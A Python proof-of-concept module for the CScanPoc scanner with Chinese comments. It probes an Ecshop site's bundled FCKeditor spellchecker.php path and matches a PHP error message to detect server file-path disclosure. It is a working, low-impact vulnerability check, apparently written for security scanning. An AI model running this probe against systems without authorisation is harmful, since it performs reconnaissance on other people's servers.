# coding: utf-8
import re

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Ecshop_0101'  # 平台漏洞编号，留空
    name = 'Ecshop /spellchecker.php 信息泄漏'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2015-03-12'  # 漏洞公布时间
    desc = '''
    Ecshop /spellchecker.php 信息泄漏漏洞。
    payload = '/includes/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php'
    verify_url = self.target + payload
    req = requests.get(verify_url)
    if req.status_code == 200:
        m = re.search('in <b>([^<]+)</b> on line <b>(\\d+)</b>', req.text)
        if m:
            self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Ecshop'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e6ffa40b-b61c-4d7e-aa40-9a09d4ff87c2'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/includes/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php'
            verify_url = self.target + payload
            req = requests.get(verify_url)
            if req.status_code == 200:
                m = re.search(
                    'in <b>([^<]+)</b> on line <b>(\\d+)</b>', req.text)
                if m:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
